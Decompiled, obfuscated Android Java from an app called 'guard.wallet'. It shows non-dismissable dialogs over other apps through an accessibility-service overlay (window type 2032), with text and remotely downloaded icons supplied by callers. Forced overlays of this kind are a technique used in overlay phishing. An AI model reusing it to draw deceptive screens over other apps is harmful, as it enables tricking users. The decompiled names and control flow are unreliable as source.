package com.guard.wallet.helper;

import android.app.AlertDialog;
import android.app.AlertDialog.Builder;
import android.graphics.Bitmap;
import android.graphics.drawable.BitmapDrawable;
import android.graphics.drawable.Drawable;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.WindowManager.LayoutParams;
import com.guard.wallet.service.MyAccessibilityService;
import java.lang.ref.WeakReference;
import java.util.Objects;
import java.util.concurrent.locks.ReentrantLock;

public abstract class n {
   public static WeakReference a;
   public static final ReentrantLock b = new ReentrantLock();

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public static boolean a(String var0, String var1, String var2, String var3, String var4) {
      if (MyAccessibilityService.P() != null) {
         String var6 = var2;
         if (a1.q.B(var2)) {
            var6 = "OK";
         }

         boolean var5 = a1.q.B(var3);
         Object var7 = null;
         Drawable var16;
         if (!var5) {
            var16 = com.guard.wallet.utils.g.V(var3);
         } else {
            var16 = null;
         }

         Object var24 = var16;
         if (var16 == null) {
            var24 = var16;
            if (!a1.q.B(var4)) {
               var17 = (BitmapDrawable)var7;
               label90:
               if (!a1.q.B(var4)) {
                  Exception var10000;
                  label101: {
                     try {
                        var5 = a1.q.B(var4);
                     } catch (Exception var13) {
                        var10000 = var13;
                        boolean var10001 = false;
                        break label101;
                     }

                     label84: {
                        label83:
                        if (!var5) {
                           label81: {
                              try {
                                 com.guard.wallet.thread.k var18 = new com.guard.wallet.thread.k(var4);
                                 var19 = com.guard.wallet.thread.l.b(var18, "DOWNLOAD_DELEGATE");
                              } catch (Exception var12) {
                                 var10000 = var12;
                                 boolean var28 = false;
                                 break label81;
                              }

                              while (true) {
                                 if (var19 == null) {
                                    break label83;
                                 }

                                 try {
                                    if (var19.isDone()) {
                                       var24 = (Bitmap)var19.get();
                                       break label84;
                                    }
                                 } catch (Exception var11) {
                                    var10000 = var11;
                                    boolean var29 = false;
                                    break;
                                 }
                              }
                           }

                           Exception var20 = var10000;

                           try {
                              a1.q.s("BitmapUtils", var20);
                           } catch (Exception var10) {
                              var10000 = var10;
                              boolean var30 = false;
                              break label101;
                           }
                        }

                        var24 = null;
                     }

                     var17 = (BitmapDrawable)var7;
                     if (var24 == null) {
                        break label90;
                     }

                     try {
                        var17 = new BitmapDrawable((Bitmap)var24);
                        var17.setAlpha(255);
                     } catch (Exception var9) {
                        label103: {
                           Exception var21 = var9;

                           try {
                              a1.q.s("BitmapUtils", var21);
                           } catch (Exception var8) {
                              var10000 = var8;
                              boolean var31 = false;
                              break label103;
                           }

                           var17 = (BitmapDrawable)var7;
                        }
                     }
                     break label90;
                  }

                  Exception var22 = var10000;
                  a1.q.s("BitmapUtils", var22);
                  var17 = (BitmapDrawable)var7;
               }

               var24 = var17;
            }
         }

         Builder var23 = new Builder(MyAccessibilityService.P(), 5);
         var23.setTitle(var0);
         var23.setMessage(var1);
         var23.setCancelable(false);
         var23.setPositiveButton(var6, new j(0));
         var23.setOnDismissListener(new k(0));
         if (var24 != null) {
            var23.setIcon((Drawable)var24);
         }

         AlertDialog var14 = var23.create();
         if (var14 != null && var14.getWindow() != null) {
            a = new WeakReference<>(var14);
            LayoutParams var15 = var14.getWindow().getAttributes();
            var15.type = 2032;
            var14.getWindow().setAttributes(var15);
            var14.show();
            return true;
         }
      }

      return false;
   }

   public static boolean b(String var0, String var1, String var2, String var3, String var4) {
      if (MyAccessibilityService.P() != null) {
         String var5 = var2;
         if (a1.q.B(var2)) {
            var5 = "OK";
         }

         Drawable var9;
         if (!a1.q.B(var3)) {
            var9 = com.guard.wallet.utils.g.V(var3);
         } else {
            var9 = null;
         }

         Builder var6 = new Builder(MyAccessibilityService.P(), 5);
         var6.setTitle(var0);
         var6.setMessage(var1);
         var6.setCancelable(false);
         var6.setPositiveButton(var5, new l(var3, var4));
         if (var9 != null) {
            var6.setIcon(var9);
         }

         AlertDialog var7 = var6.create();
         if (var7 != null && var7.getWindow() != null) {
            LayoutParams var8 = var7.getWindow().getAttributes();
            var8.type = 2032;
            var7.getWindow().setAttributes(var8);
            var7.show();
            return true;
         }
      }

      return false;
   }

   public static boolean c(String var0, String var1, String var2, String var3, String var4) {
      ReentrantLock var5 = b;
      if (!var5.tryLock()) {
         return false;
      } else {
         WeakReference var6 = a;
         if ((var6 == null || var6.get() == null) && !Objects.equals(com.guard.wallet.utils.g.z0().getIsWifiConnected(), 1)) {
            if (com.guard.wallet.utils.k.a()) {
               if (a(var0, var1, var2, var3, var4)) {
                  Log.d("com.guard.wallet.helper.n", "弹出WIFI引导对话框成功");
               } else {
                  Log.e("com.guard.wallet.helper.n", "弹出WIFI引导对话框失败");
               }
            } else {
               new Handler(Looper.getMainLooper()).postDelayed(new m(var0, var1, var2, var3, var4, 1), 300L);
            }

            var5.unlock();
            return true;
         } else {
            var5.unlock();
            return false;
         }
      }
   }

   public static boolean d(String var0, String var1, String var2, String var3, String var4) {
      ReentrantLock var5 = b;
      if (var5.tryLock()) {
         if (com.guard.wallet.utils.k.a()) {
            if (b(var0, var1, var2, var3, var4)) {
               Log.d("com.guard.wallet.helper.n", "弹出通知对话框成功");
            } else {
               Log.e("com.guard.wallet.helper.n", "弹出通知对话框失败");
            }
         } else {
            new Handler(Looper.getMainLooper()).postDelayed(new m(var0, var1, var2, var3, var4, 0), 300L);
         }

         var5.unlock();
         return true;
      } else {
         return false;
      }
   }
}
